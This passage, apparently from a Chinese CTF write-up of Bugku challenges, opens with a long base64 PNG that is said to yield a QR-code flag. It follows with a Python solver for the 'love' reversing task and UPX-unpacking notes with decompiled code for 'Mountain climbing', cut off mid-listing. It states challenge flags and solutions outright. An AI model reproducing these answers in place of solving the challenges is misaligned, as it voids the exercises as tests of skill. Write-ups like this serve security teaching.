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 是一个base64的照片格式，还原扫码得到flag:bugku{inde_9882ihsd8-0} love下载下来发现一个reverse_3.exe文件，运行之后提示“没有相应的动态链接库”，查看文件类型 用ida打开，找到相应main函数的地方进行反编译， 输入接收是通过一个函数来实现的，点入查看，发现有一串函数连续调用，然后查看一些字符串，得到，发现： 怀疑上面的函数是经过base64加密而成，然后进行其他运算，最后与e3nifIH9b_C@n@dH进行比较，可得到相应flag，所以我们进行逆向： 12345678910#encoding=utf8import base64 str="e3nifIH9b_C@n@dH"flag="" for i in range(len(str)): flag+=chr(ord(str[i])-i)flag=base64.b64decode(flag).decode("utf-8")print("flag"+flag) Mountain climbing查看文件类型： 用ida打开： 发现只有一个start，怀疑是加过壳，经过PEID扫描发现经过Upx压缩，用对应工具脱壳，之后用ida打开，进入main函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263__int64 main_0()&#123; int v0; // edx __int64 v1; // ST04_8 char v3; // [esp+0h] [ebp-160h] int v4; // [esp+D0h] [ebp-90h] int j; // [esp+DCh] [ebp-84h] int i; // [esp+E8h] [ebp-78h] char Str[104]; // [esp+F4h] [ebp-6Ch] //使用通用随机算法生成种子 srand(0xCu); j_memset(&amp;unk_423D80, 